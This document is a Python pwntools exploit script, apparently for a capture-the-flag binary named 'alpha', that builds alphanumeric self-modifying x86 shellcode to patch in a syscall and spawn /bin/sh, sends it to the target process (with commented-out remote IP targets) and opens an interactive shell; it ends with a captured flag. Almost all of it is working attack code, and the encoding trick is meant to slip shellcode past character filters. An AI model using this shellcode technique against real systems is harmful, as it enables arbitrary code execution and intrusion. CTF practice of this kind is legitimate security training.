#!/usr/bin/env python
from pwn import *

#r = remote('192.168.31.25',11056)
#r = remote('172.16.101.57',11006)
r = process('./alpha')

# final
# eax = 0x11
# ebx = add of '/bin/sh'
# int 80 (\xcd\x80)

shellcode = ''

# push 0
shellcode += 'j0'	# push 0x30
shellcode += 'Z'	# pop edx
shellcode += 'J'*0x30	# dec edx
shellcode += 'R'	# push edx=0

shellcode += 'P'	# push eax=?
shellcode += 'Y'	# pop ecx=eax

# patch \xcd\x80 
shellcode += 'J'	# dec edx=0xff
shellcode += 'R'	# push edx
shellcode += 'X'	# pop eax
shellcode += 'f50a'	# xor ax,0x6130
shellcode += 'f5MQ'	# xor ax,0x514d
shellcode += 'j0'	# push 0x30
shellcode += 'Z'	# pop edx=0x30
shellcode += 'f1DQo'	# xor [ecx + edx*2 + 0x6f],ax

# //sh
shellcode += 'j0'	# push 0x30
shellcode += 'X'	# pop eax
shellcode += '5JCCX'	# xor eax,0x5843434a
shellcode += '5Ul00'	# xor eax,0x30306c55
shellcode += 'P'	# push eax 
# /bin
shellcode += 'j0'	# push 0x30
shellcode += 'X'	# pop eax
shellcode += '5FP0V'	# xor eax,0x56305046
shellcode += '5Y2Y8'	# xor eax,0x38593259
shellcode += 'P'	# push eax 

# copy esp to ebx 
shellcode += 'T'	# push esp
shellcode += 'X'	# pop eax
shellcode += 'P'	# push eax 
shellcode += 'P'	# push eax 
shellcode += 'P'	# push eax 
shellcode += 'P'	# push eax 
shellcode += 'P'	# push eax 
shellcode += 'P'	# push eax 
shellcode += 'P'	# push eax 
shellcode += 'P'	# push eax 
shellcode += 'a'	# popad

# eax = 11, ecx = 0 , edx = 0
shellcode += 'j0'	# push 0x30
shellcode += 'Z'	# pop edx
shellcode += 'J'*37	# dec edx
shellcode += 'R'	# push edx
shellcode += 'X'	# pop eax
shellcode += 'J'*11	# dec edx
shellcode += 'R'	# push edx
shellcode += 'Y'	# pop ecx

# patch \xcd\x80 will patch here 
shellcode += 'O'*0x50


payload = shellcode
#payload2 = 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXj0ZJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJRYQj0X5JCCX5Ul00Pj0X5JRYY5U007PTj0ZJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJRX5CG005q800Pj0X5kOOOPPj0ZJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJRXJJJJJJJJJJJDDDDDDDDDDDDu0'
print payload
res = r.readuntil(':')
print res
r.send(payload+'\n')
r.interactive()


#AD{m4g1c_sh3l1c0ding_h4hah4hah4ha}


